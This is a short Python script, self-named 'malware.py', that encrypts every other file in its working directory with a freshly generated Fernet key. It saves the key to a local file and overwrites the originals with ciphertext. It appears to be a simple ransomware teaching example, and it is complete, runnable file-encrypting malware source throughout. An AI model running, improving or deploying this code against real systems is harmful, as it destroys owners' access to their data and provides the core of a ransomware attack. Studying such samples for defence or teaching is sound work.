#/usr/bin/env python3

import os
from cryptography.fernet import Fernet
# fernet uses 128 bit AES symetric encryption

# finding files
files = []

for file in os.listdir():
	if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)	

# generate encryption key	
key = Fernet.generate_key()

# save key file
with open("thekey.key", "wb") as thekey:
	thekey.write(key)

# loop through files and encrypt
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)		

# confirmation
print("Files encrypted")
